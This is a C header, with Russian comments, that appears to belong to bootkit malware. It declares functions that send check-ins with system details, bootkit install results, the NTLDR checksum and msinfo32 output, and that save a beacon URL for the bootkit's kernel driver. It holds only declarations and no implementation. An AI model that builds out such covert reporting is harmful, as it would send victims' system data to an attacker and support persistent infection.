#ifndef UUID_E4500F5134534F79A3663021D13CDBC8
#define UUID_E4500F5134534F79A3663021D13CDBC8

// Ф-ция инициализации отправки сообщений
void DebugReportInit();

// Отстук с информацией о системе (будет заменяться контрольными точками в будущем)
void DebugReportSystem();

// Отстук с информацией о коде установки
void DebugReportBkInstallCode(DWORD BkInstallResult);

// Отстук по именной контрольной точке
void DebugReportStepByName(const char* StepName);

// Отстук с информацией о MD5 файла NTLDR
void DebugReportUpdateNtldrCheckSum();

// Отправка полной системной информации (результат работы msinfo32.exe)
void DebugReportCreateConfigReportAndSend();

// Сохранение URL, который будет использовать драйвер буткита для отстука из ядра
bool DebugReportSaveUrlForBootkitDriver();

// Сохранение параметров для команд, которые устанавливают параметры статистического отстука
void DebugReportSaveSettings(const char* ParamsList);

// Запуск тестов для просмотра отладочного вывода
void DebugReportRunTests();

#endif // #ifndef UUID_E4500F5134534F79A3663021D13CDBC8